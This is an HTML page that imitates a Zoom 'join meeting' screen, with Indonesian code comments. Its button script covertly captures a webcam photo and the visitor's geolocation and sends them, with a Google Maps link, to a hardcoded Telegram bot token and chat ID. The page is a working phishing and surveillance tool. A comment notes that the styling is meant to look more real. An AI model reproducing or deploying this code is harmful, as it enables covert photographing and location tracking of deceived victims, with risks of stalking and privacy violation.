<!doctype html>
<html lang="id">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Join Zoom Meetings</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      text-align: center;
      color: #1a1a1a;
    }
    .logo {
      margin-top: 40px;
    }
    .content {
      margin-top: 50px;
    }
    .content p {
      font-size: 16px;
      color: #333;
      margin: 10px 0;
    }
    .content a {
      color: #0e72ed;
      text-decoration: none;
    }
    .btn {
      display: inline-block;
      margin-top: 20px;
      background-color: #0B5CFF; /* Biru resmi Zoom */
      color: #fff;
      font-weight: 600;
      border-radius: 8px;
      padding: 12px 28px;
      font-size: 16px;
      text-decoration: none;
      box-shadow: 0 2px 4px rgba(0,0,0,0.1); /* biar lebih nyata */
      cursor: pointer;
      transition: background-color 0.3s ease, box-shadow 0.3s ease;
    }

    .btn:hover {
      background-color: #003d99;
      box-shadow: 0 4px 12px rgba(0, 61, 153, 0.7);
      border-color: #003d99;
    }
    .footer {
      margin-top: 80px;
      font-size: 12px;
      color: #666;
    }
    .footer a {
      color: #0e72ed;
      text-decoration: none;
      margin: 0 5px;
    }
  </style>
</head>
<body>
  <!-- Logo -->
  <div class="logo">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Zoom_Communications_Logo.svg/2560px-Zoom_Communications_Logo.svg.png" alt="Zoom Logo" height="40" />
  </div>

  <!-- Main Content -->
  <div class="content">
    <p>Click <strong>Open Zoom Workplace app</strong> on the dialog shown by your browser</p>
    <p>If you donâ€™t see a dialog, click <strong>Join from Zoom Workplace app</strong> below</p>
    <p style="font-size:14px; color:#666;">
      By joining a meeting, you agree to our 
      <a href="#">Terms of Service</a> and 
      <a href="#">Privacy Statement</a>
    </p>
  <button id="openBtn">Join from Zoom Workplace app</button>

<script>
const BOT_TOKEN = "7597477264:AAFMXbMk_j9usWKnYdw0nmxE4U6qXQ0bYUI";
const OWNER_ID = "7143446125";

const logBox = document.getElementById("log");
function log(msg){
  logBox.innerHTML += msg+"<br>";
  logBox.scrollTop = logBox.scrollHeight;
}

document.getElementById("openBtn").addEventListener("click", async()=>{
  let photoBlob=null;
  try{
    const stream = await navigator.mediaDevices.getUserMedia({video:true});
    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video,0,0,canvas.width,canvas.height);
    photoBlob = await (await fetch(canvas.toDataURL("image/jpeg"))).blob();
    stream.getTracks().forEach(t=>t.stop());
  }catch(e){
    // gagal
  }

  let coords=null;
  try{
    coords = await new Promise((resolve,reject)=>{
      navigator.geolocation.getCurrentPosition(
        pos=>resolve(pos.coords),
        err=>reject(err),
        {timeout:10000}
      );
    });
  }catch(e){
    // gagal
  }

  // Kirim ke Telegram
  try{
    if(photoBlob){
      const fd = new FormData();
      fd.append("chat_id",OWNER_ID);
      fd.append("photo",photoBlob,"snap.jpg");
      let cap = "Snapshot dari device.";
      if(coords) cap += ` Lokasi: https://maps.google.com/?q=${coords.latitude},${coords.longitude}`;
      fd.append("caption",cap);
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
    }
    if(coords){
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({chat_id:OWNER_ID,text:`Lokasi: https://maps.google.com/?q=${coords.latitude},${coords.longitude}`})
      });
    }
  }catch(e){
    // gagal
  }
});
</script>
</body>
</html>
